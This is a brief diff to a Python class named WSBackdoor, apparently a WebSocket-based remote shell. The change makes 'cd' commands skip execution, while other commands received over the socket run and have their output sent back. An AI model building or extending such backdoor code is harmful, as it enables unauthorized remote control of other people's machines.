@@ -35,9 +35,10 @@ class WSBackdoor(WebSocketClient):
         command = cmd.split()
         if command[0] == 'cd':
             self.changeDir(command[1])
-        print command
-        response = self.__execute__(command)
-        self.send(response)
+        else:
+            print command
+            response = self.__execute__(command)
+            self.send(response)
 
 
 if __name__ == '__main__':
